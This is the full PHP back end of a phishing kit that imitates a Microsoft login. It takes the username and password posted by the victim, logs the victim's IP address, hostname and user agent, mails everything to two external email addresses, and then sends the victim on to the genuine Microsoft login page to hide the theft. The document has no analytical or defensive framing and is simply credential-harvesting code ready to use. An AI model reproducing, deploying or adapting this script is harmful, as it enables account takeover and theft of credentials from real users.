<?php
if($_POST["uname"] != "" and $_POST["psw"] != ""){
$ip = getenv("REMOTE_ADDR");
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| INFO |--------------|\n";
$message .= "|Username : ".$_POST['uname']."\n";
$message .= "|pswword : ".$_POST['psw']."\n";
$message .= "|--------------- -------------------|\n";
$message .= "|IP: ".$ip."\n";

$send = "quando9z@outlook.com, quando9z@yahoo.com";
$subject = "EU | $ip - LOG RESULTS 1";
{
mail("$send", "$subject", $message);   
}
  $praga=rand();
$praga=md5($praga);
  header ("Location: https://login.microsoftonline.com/jsdisabled");
}else{
header ("Location: index.php");
}

?>